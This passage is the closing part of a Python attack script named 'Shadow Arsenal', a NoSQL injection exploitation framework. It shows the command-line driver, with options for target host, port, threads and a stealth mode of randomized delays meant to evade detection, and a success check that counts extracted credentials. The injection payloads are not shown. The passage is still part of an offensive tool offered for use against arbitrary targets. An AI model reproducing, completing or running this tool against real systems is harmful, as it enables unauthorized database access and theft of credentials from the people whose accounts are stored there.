        # Final status
        successful_count = len([k for k, v in results.items() if v])
        if successful_count > 0:
            self.log_success(f"Mission accomplished: {successful_count} credentials extracted")
            return True
        else:
            self.log_warning("Mission completed with limited success")
            return False

def main():
    """Main execution function with advanced argument parsing"""
    parser = argparse.ArgumentParser(
        description="Shadow Arsenal - Advanced NoSQL Injection Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 exploit_nosqli.py -t 192.168.1.100 -p 5000
  python3 exploit_nosqli.py -t target.com -p 8080 --threads 20 --verbose
  python3 exploit_nosqli.py -t 10.0.0.1 --timeout 15 --output custom_report.txt
        """
    )
    
    parser.add_argument("--target", "-t", 
                       default="127.0.0.1",
                       help="Target IP address or hostname (default: 127.0.0.1)")
    
    parser.add_argument("--port", "-p", 
                       type=int, 
                       default=5000,
                       help="Target port (default: 5000)")
    
    parser.add_argument("--threads", 
                       type=int, 
                       default=10,
                       help="Number of concurrent threads (default: 10)")
    
    parser.add_argument("--timeout", 
                       type=int, 
                       default=10,
                       help="Request timeout in seconds (default: 10)")
    
    parser.add_argument("--verbose", "-v", 
                       action="store_true",
                       help="Enable verbose output")
    
    parser.add_argument("--output", "-o",
                       help="Output file for detailed report")
    
    parser.add_argument("--stealth", 
                       action="store_true",
                       help="Enable stealth mode with randomized delays")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.threads < 1 or args.threads > 50:
        print(f"{Colors.RED}[✗] Thread count must be between 1 and 50{Colors.RESET}")
        sys.exit(1)
    
    if args.timeout < 1 or args.timeout > 60:
        print(f"{Colors.RED}[✗] Timeout must be between 1 and 60 seconds{Colors.RESET}")
        sys.exit(1)
    
    # Initialize the injector
    try:
        injector = AdvancedNoSQLInjector(
            target_ip=args.target,
            port=args.port,
            threads=args.threads,
            timeout=args.timeout,
            verbose=args.verbose
        )
        
        # Run the assessment
        success = injector.run_comprehensive_assessment()
        
        # Exit with appropriate code
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Assessment interrupted by user{Colors.RESET}")
        sys.exit(130)
    except Exception as e:
        print(f"{Colors.RED}[✗] Critical error: {str(e)}{Colors.RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()